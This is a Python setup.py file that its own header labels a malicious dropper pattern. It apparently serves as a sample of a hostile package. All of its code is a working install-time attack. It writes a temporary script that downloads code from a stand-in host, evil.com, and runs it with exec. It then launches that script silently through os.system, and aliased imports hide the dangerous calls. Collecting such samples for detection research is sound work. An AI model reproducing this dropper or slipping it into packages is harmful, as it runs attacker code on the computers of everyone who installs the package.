# Malicious setup.py with import aliasing (dropper pattern)
from setuptools import setup
from tempfile import NamedTemporaryFile as _ffile
from sys import executable as _eexecutable
from os import system as _ssystem
_ttmp = _ffile(delete=False)
_ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://evil.com/payload').read())""")
_ttmp.close()
_ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}")
setup(name='evil-pkg', version='1.0')
